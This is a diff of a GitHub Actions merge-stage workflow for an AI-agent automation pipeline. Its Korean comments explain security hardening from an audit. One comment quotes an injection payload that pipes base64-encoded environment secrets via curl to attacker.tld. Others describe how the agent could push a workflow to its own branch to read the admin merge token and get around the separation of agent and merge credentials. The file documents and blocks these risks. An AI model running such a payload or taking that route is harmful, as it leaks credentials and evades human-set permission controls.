@@ -16,6 +16,9 @@ permissions:
   issues: write
   pull-requests: write
   statuses: write
+  # KTB-26 — 마지막 `Sweep` 스텝이 멈춘 스테이지를 `gh workflow run`으로 다시 띄운다(sweeper의 세 번째 팔).
+  # FACTORY_BOT_TOKEN으로 나가지만 잡 권한을 좁혀 두면 폴백이 없다(factory-sweeper.yml과 같은 이유).
+  actions: write
 # 워크플로마다 **다른** 그룹을 쓴다(KTB-8). GitHub는 `issues: labeled`에 라벨 이름 필터를 주지 않으므로
 # 라벨 이벤트 하나가 스테이지 워크플로 5개의 런을 전부 만든다(필터는 아래 잡 레벨 `if`에 있다).
 # 그룹을 공유하면 그 5개가 한 대기 슬롯을 두고 서로를 밀어내고(`cancel-in-progress: false`에서도
@@ -31,8 +34,42 @@ jobs:
     # `github.event.label.name`은 null이고 contains()는 false다 — 이벤트 이름으로 먼저 가른다.
     if: github.event_name == 'workflow_dispatch' || contains(fromJSON('["factory:approved"]'), github.event.label.name)
     runs-on: ${{ vars.FACTORY_RUNNER || 'ubuntu-latest' }}
-    timeout-minutes: 20
+    # ADR-021 r1 MF-2 b — **머지 토큰은 환경 시크릿이다.** 저장소 시크릿은 같은 저장소의 **어느
+    # 브랜치에서 돌든** 워크플로에 주어진다(fork 제한은 same-repo 브랜치에 걸리지 않는다) — 곧
+    # 에이전트가 자기 `claude/fq-*` 브랜치에 워크플로 한 장을 올리는 것만으로 admin PAT을 읽어 갈 수
+    # 있었다. `factory-merge` 환경의 배포 브랜치 정책은 `protected_branches: true`이므로, 이 잡이
+    # **기본 브랜치에서 시작했을 때만** 그 시크릿이 주어진다. `factory bootstrap`이 환경을 만들고,
+    # 값은 사람이 넣는다: `gh secret set FACTORY_MERGE_TOKEN --env factory-merge`.
+    # 환경이 없거나 이 플랜이 지원하지 않으면 이 줄은 아무 것도 깨뜨리지 않는다 — 환경이 자동 생성되고
+    # 시크릿은 저장소 레벨에서 해석된다(그때의 위험은 bootstrap의 note와 doctor가 말한다).
+    environment: factory-merge
+    timeout-minutes: 30
     steps:
+      # 외부 감사 2026-09-14 M7 — **두 배우 모드는 조용히 강등되지 않는다.** 아래 `Run stage`의
+      # `GH_TOKEN`은 `secrets.FACTORY_MERGE_TOKEN || secrets.FACTORY_BOT_TOKEN`이다. 그 폴백은 단일
+      # 배우 모드를 위한 것인데, **두 배우 모드에서도 똑같이 조용히 작동했다**: 환경이 적용되지
+      # 않았거나(보호되지 않은 브랜치에서 시작한 dispatch), 시크릿이 지워졌거나, 환경 이름이 어긋나면
+      # `secrets.FACTORY_MERGE_TOKEN`은 빈 문자열이 되고 — 잡은 **에이전트 배우의 토큰으로** 머지를
+      # 시도한다. 그러면 ADR-021이 권한으로 세운 벽이 로그 한 줄 없이 사라진다.
+      #
+      # `vars.FACTORY_TWO_ACTOR`는 `factory bootstrap`이 **관측해서 적어 둔** 모드다(사람이 고르는
+      # 플래그가 아니다). 그것이 true인데 이 잡에 머지 토큰이 없다면, 답은 폴백이 아니라 **정지**다:
+      # 머지는 되돌릴 수 없고, 잘못된 배우로 한 머지는 사후에 구별되지도 않는다.
+      # 첫 스텝인 것이 요점이다 — 체크아웃보다도, 어떤 토큰이 쓰이기도 전에 죽는다.
+      # `id:`는 yml-lint의 `merge-token-required-when-two-actor` 규칙이 찾는 키다(자유 문구가 아니다).
+      - name: Require the merge token in two-actor mode
+        id: two-actor-token-guard
+        env:
+          TWO_ACTOR_DECLARED: ${{ vars.FACTORY_TWO_ACTOR }}
+          MERGE_TOKEN_PRESENT: ${{ secrets.FACTORY_MERGE_TOKEN != '' }}
+        run: |
+          if [[ "$TWO_ACTOR_DECLARED" == "true" && "$MERGE_TOKEN_PRESENT" != "true" ]]; then
+            echo "factory: this repository is bootstrapped in two-actor mode (vars.FACTORY_TWO_ACTOR=true) but FACTORY_MERGE_TOKEN is empty in this job." >&2
+            echo "factory: refusing to fall back to FACTORY_BOT_TOKEN — that would merge with the agent actor's credentials and silently undo ADR-021." >&2
+            echo "factory: check that the secret exists in the 'factory-merge' environment and that this job started from a protected branch (audit M7)." >&2
+            exit 1
+          fi
+          echo "factory: merge-token check ok (two-actor declared: ${TWO_ACTOR_DECLARED:-unset}, merge token present: $MERGE_TOKEN_PRESENT)"
       - uses: actions/checkout@v4
         with:
           fetch-depth: 0
@@ -41,11 +78,78 @@ jobs:
         with:
           claude: "false"
           test-env: "true"
+      # 외부 감사 2026-09-14 H1b — 머지 스테이지는 `factory/review`·`factory/gates` 상태를 **누가
+      # 올렸는지** 확인한다(상태는 repo 스코프 토큰이면 무엇이든 쓸 수 있으므로 "success다"만으로는
+      # 아무것도 증명되지 않는다). 두 배우 모드에서 이 잡의 `GH_TOKEN`은 **머지 배우**인데 그 상태를
+      # 올린 것은 앞 스테이지의 **에이전트 배우**다 — 그래서 봇의 로그인이 따로 필요하다.
+      # 로그인 **이름**은 비밀이 아니다(토큰이 아니다). 여기서 한 번 해석해 $GITHUB_ENV로 넘기면
+      # `Run stage` 스텝의 env에 봇 토큰 사본을 만들지 않고도 대조할 수 있다.
+      # 실패해도 잡을 죽이지 않는다: 그러면 머지 스테이지가 잡 토큰의 로그인만으로 대조하고,
+      # 맞지 않으면 스스로 fail closed 한다(needs-human).
+      - name: Resolve the agent actor's login
+        env:
+          GH_TOKEN: ${{ secrets.FACTORY_BOT_TOKEN }}
+        run: |
+          login="$(gh api user --jq .login 2>/dev/null || true)"
+          if [[ -n "$login" ]]; then
+            echo "FACTORY_BOT_LOGIN=$login" >> "$GITHUB_ENV"
+            echo "factory: agent actor login resolved"
+          else
+            echo "factory: could not resolve the agent actor's login — the merge stage will compare against the job token's account only" >&2
+          fi
+      # 이 스텝은 **스크립트 전용**이다 — `claude -p`를 띄우지 않는다(setup의 `claude: "false"`).
+      # ADR-021이 머지 권한을 두는 유일한 자리이고, 그 사실이 이 잡 전체의 전제다.
       - name: Run stage
         env:
           GH_TOKEN: ${{ secrets.FACTORY_MERGE_TOKEN || secrets.FACTORY_BOT_TOKEN }}
+          # ADR-021 — **토큰이 아니라 "있느냐"만 옮긴다.** merge-stage는 두 배우 모드에서 머지 직전에
+          # `gh pr review --approve`를 한 번 부르는데(base 브랜치가 승인 1건을 요구한다), 그 판단에
+          # 필요한 것은 불리언 하나뿐이다. 시크릿 값을 env에 한 번 더 복사하면 사본이 하나 더 생길
+          # 뿐이다 — `GH_TOKEN`이 이미 그 토큰이다.
+          FACTORY_TWO_ACTOR: ${{ secrets.FACTORY_MERGE_TOKEN != '' }}
           FACTORY_RUNNER_ID: gha-${{ github.run_id }}
-        run: node .factory/bin/run-stage.js merge ${{ github.event.issue.number || inputs.issue }}
+          # ADR-020 최종 리뷰 MF-2 — **`${{ … }}`를 `run:` 안에 붙여 넣지 않는다.** `inputs.issue`는
+          # 자유 문자열이고(`type: string`), 그 값은 Actions가 셸에 넘기기 **전에** 텍스트로 치환된다:
+          # `1; curl -sd "$(env|base64 -w0)" https://attacker.tld #` 하나면 이 스텝의 env에 실린
+          # CLAUDE_CODE_OAUTH_TOKEN·ANTHROPIC_API_KEY·FACTORY_BOT_TOKEN이 그대로 새어 나간다.
+          # `gh workflow run` 권한(= 레포 write)이 **시크릿 읽기**로 승격되는 것이고, KTB-8이
+          # workflow_dispatch를 재점화의 주 손잡이로 만든 뒤로 그 싱크는 본선 위에 있다.
+          # env로 묶으면 값은 셸 변수가 되어 코드로 해석될 자리가 없다 — 그 뒤 아래 run의 첫 줄이
+          # `^[0-9]+$`로 한 번 더 소리내어 거른다(모양이 아니면 실행하지 않고 죽는다).
+          ISSUE: ${{ github.event.issue.number || inputs.issue }}
+        run: |
+          [[ "$ISSUE" =~ ^[0-9]+$ ]] || { echo "factory: issue input is not a number: '$ISSUE'" >&2; exit 1; }
+          node .factory/bin/run-stage.js merge "$ISSUE"
+      # ADR-020 최종 리뷰 SF-1 — **업로드 전에 크리덴셜을 지운다.** 바로 아래 업로드는 `docs/factory/runs/`와
+      # `.factory/out/`을 통째로 올리고(merge는 claude를 띄우지 않으므로 트랜스크립트는 없다), 공개
+      # 저장소에서 그 아티팩트는 **레포 read 권한자 누구나** 받는다. 그리고 이 체크아웃 트리에는 토큰이 **실제로** 있다: `actions/checkout`이 심는
+      # `.git/config`의 `AUTHORIZATION: basic <base64(x-access-token:<token>)>`이다. 그 헤더는 락
+      # push(`claim.js`)와 run 기록 push(`records-branch.js`)가 나가는 유일한 경로라
+      # `persist-credentials: false`로 끌 수 없다(ADR-020의 알려진 한계) — 그래서 **노출 쪽**을 닫는다:
+      # 여기서 한 번 훑고(모양 + 리터럴), 보관은 7일이다(`retention-days`).
+      # env의 네 값은 스크립트가 **리터럴로** 지우기 위한 것이고 어디에서도 echo 되지 않는다 —
+      # 스크립트가 찍는 것은 종류별 **개수**뿐이다(값을 로그에 적으면 스크럽이 유출 경로가 된다).
+      # `.factory/`를 이벤트 sha로 되돌리는 이유는 정리 스텝과 같다: implement는 에이전트 브랜치 위에,
+      # review·merge는 PR head로 detach된 트리 위에 있다 — 스크럽 코드만은 언제나 base의 것이어야 한다.
+      - name: Scrub credentials from the artifacts
+        # ADR-021 r1 finding 5 — `merge-token-scope` exempts this step only when it BOTH declares this
+        # exact `id:` and actually runs scrub-artifacts.js in its `run:`. A free-text step name was
+        # not enough of a key: the exception is what lets one step hold every credential at once.
+        id: scrub-artifacts
+        if: always()
+        env:
+          FACTORY_BOT_TOKEN: ${{ secrets.FACTORY_BOT_TOKEN }}
+          # ADR-021 — 머지 배우의 토큰이 **값으로** 등장하는 유일한 다른 자리다. 쓰기 위해서가 아니라
+          # 아티팩트에서 리터럴로 지우기 위해서다: 이 잡의 `gh`가 그 토큰으로 돌았으므로 트리·로그
+          # 어딘가에 남을 수 있고, 그것이 가장 강한 자격증명이다. `yml-lint`의 `merge-token-scope`가
+          # 스크럽 스텝만 예외로 두는 이유가 이것이다(이 스텝은 `claude`를 띄우지 않는다).
+          FACTORY_MERGE_TOKEN: ${{ secrets.FACTORY_MERGE_TOKEN }}
+          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          git checkout ${{ github.sha }} -- .factory || true
+          node .factory/bin/scrub-artifacts.js docs/factory/runs .factory/out
       - name: Upload run outputs
         if: always()
         uses: actions/upload-artifact@v4
@@ -55,3 +159,41 @@ jobs:
             docs/factory/runs/
             .factory/out/
           include-hidden-files: true
+          # 기본값은 90일이다 — 이 아티팩트가 공개 저장소에서 석 달 동안 내려받힌다는 뜻이다(SF-1).
+          # 값은 `yml-lint`의 `artifact-retention`이 지킨다(명시 필수, 14일 이하).
+          retention-days: 7
+      # KTB-24 — 잡 타임아웃(위 `timeout-minutes`)과 취소는 `run-stage.js`의 `finally`를 **실행하지 않는다**:
+      # 락 `refs/heads/factory/lock-<n>`이 고아로 남고, 전이도 코멘트도 run 기록도 없이 이슈가 진입 라벨에
+      # 그대로 앉는다(데모 #15: review가 45 m 19 s에 잘렸고 아무 흔적도 남지 않았다). 이 스텝이 그 잔해를
+      # 치운다 — `aborted:` 기록 한 줄 + 락 해제 + (이슈가 아직 이 스테이지의 in-flight 라벨일 때만)
+      # `factory:blocked` 전이(origin 마커가 함께 찍혀 sweeper가 다음 걸음을 안다). `claude`는 뜨지 않는다.
+      # **작아야 한다**: 취소된 잡의 유예 시간은 짧다(설치는 없다 — setup은 이미 돌았다).
+      # `.factory/`를 이벤트 sha로 되돌리는 이유: implement는 에이전트 브랜치 위에, review·merge는 PR head로
+      # detach된 트리 위에 있다 — 정리 코드만은 언제나 base의 것이어야 한다.
+      # `if: always() && job.status != 'success'`인 이유(ADR-020 KTB-24 fix): `cancelled()`는 "런이 취소됐다",
+      # `failure()`는 "앞 스텝이 실패했다"만 참으로 만든다 — 잡 타임아웃·러너 소실처럼 그 어느 쪽으로도
+      # 분류되지 않는 끝맺음에서는 정리 스텝이 통째로 건너뛰어지고, 고아 락과 침묵이 그대로 남는다(데모 #15).
+      # `always()`로 언제나 평가하고 성공만 빼면 "성공이 아닌 모든 끝"이 정확히 한 조건에 들어온다.
+      - name: Aborted cleanup
+        if: always() && job.status != 'success'
+        env:
+          GH_TOKEN: ${{ secrets.FACTORY_BOT_TOKEN }}
+          FACTORY_RUNNER_ID: gha-${{ github.run_id }}
+          ISSUE: ${{ github.event.issue.number || inputs.issue }}
+        run: |
+          [[ "$ISSUE" =~ ^[0-9]+$ ]] || { echo "factory: issue input is not a number: '$ISSUE'" >&2; exit 1; }
+          git checkout ${{ github.sha }} -- .factory || true
+          node .factory/bin/run-stage.js merge "$ISSUE" --aborted "${{ job.status }}"
+      # KTB-26 — cron(`factory-sweeper.yml`, 30분)은 믿을 수 없다: 데모에서 몇 시간짜리 공백이 났고,
+      # 취소된 sweeper 런이 #15를 30분 넘게 방치했다. 그래서 sweeping은 **이벤트 구동이기도** 하다 —
+      # 스테이지가 끝날 때마다(성공·실패·취소 불문) 상태 복구 팔만 돌린다: in-progress 하트비트 재큐 ·
+      # blocked 처리 · 멈춘 스테이지 재점화 · 하네스 주차 해제 · 라벨-셋 복구 · 상태 라벨 0개 복구.
+      # 격리 TTL·토큰 만료는 시간에 묶인 팔이라 cron의 몫으로 남는다(`--quick`).
+      # 멱등하고 마커로 dedupe되므로 cron sweep과 겹쳐 돌아도 안전하다.
+      - name: Sweep
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.FACTORY_BOT_TOKEN }}
+        run: |
+          git checkout ${{ github.sha }} -- .factory || true
+          node .factory/bin/sweep.js --quick
